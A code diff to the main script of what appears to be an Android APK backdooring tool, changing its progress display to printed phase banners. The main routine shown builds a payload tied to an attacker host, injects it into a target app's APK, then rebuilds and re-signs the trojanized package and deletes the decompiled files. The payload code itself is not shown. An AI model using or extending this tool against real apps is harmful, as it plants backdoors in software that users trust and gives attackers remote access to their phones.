@@ -9,6 +9,8 @@ from colorama import Fore, Style
 from . import __version__
 from .apk import Apk
 from .payload import Payload
+from . import utilities
+from .utilities import print_phase, phase_done
 
 
 def ip_port_value(string):
@@ -82,27 +84,41 @@ def setup_args():
 
 
 def main():
-    widgets = [
-        Fore.YELLOW, ' [', progressbar.Timer(), '] ',
-        progressbar.Bar(), Style.RESET_ALL
-    ]
+    # widgets = [
+    #     Fore.YELLOW, ' [', progressbar.Timer(), '] ',
+    #     progressbar.Bar(), Style.RESET_ALL
+    # ]
+
+    utilities.clear_screen()
+    print(Fore.RED + utilities.get_title(center=True) + Style.RESET_ALL)
 
     args = setup_args()
     logging.basicConfig(level=args.verbosity, filename='apk_backdoor.log')
-    progress = progressbar.ProgressBar(max_value=6, widgets=widgets, redirect_stdout=True)
-    progress.update(0)
+
+    # progress = progressbar.ProgressBar(max_value=6, widgets=widgets, redirect_stdout=True)
+    # progress.update(0)
 
     payload = Payload(args.host, args.public_host)
-    progress.update(1)
+    # progress.update(1)
 
     apk = Apk(args.apk)
+    
+    print('[ ==== PAYLOAD INJECTION ==== ]'.center(120))
     payload.inject(apk)
-    progress.update(2)
+    # progress.update(2)
     payload.delete()
-    progress.update(3)
+    print('[ ==== TARGET FINALIZATION ==== ]'.center(120))
+    # progress.update(3)
+    print_phase("Building modified target's APK")
     apk.build()
-    progress.update(4)
+    phase_done()
+    # progress.update(4)
+    print_phase("Signing modified target's APK")
     apk.sign()
-    progress.update(5)
+    phase_done()
+    # progress.update(5)
+    print_phase("Removing target's APK decompilation's results")
     apk.remove_decompiled()
-    progress.update(6)
+    phase_done()
+    # progress.finish(6)
+    print()
